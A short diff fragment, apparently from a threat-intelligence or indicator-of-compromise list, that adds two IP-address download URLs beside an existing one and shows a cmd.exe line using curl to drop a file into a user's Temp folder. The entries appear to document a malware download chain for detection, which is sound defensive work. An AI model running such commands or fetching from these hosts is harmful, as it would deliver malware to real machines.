@@ -25,6 +25,8 @@ cmd.exe" /q /c echo 'BRYRD' && ""curl"" -o C:\Users\Admin\AppData\Local\Temp\Hro
 ******************************
 
 89.38.225.174/%random%.dat
+217.195.153.10/%random%.dat
+23.29.125.107/%random%.dat
 
 *************************************************
 
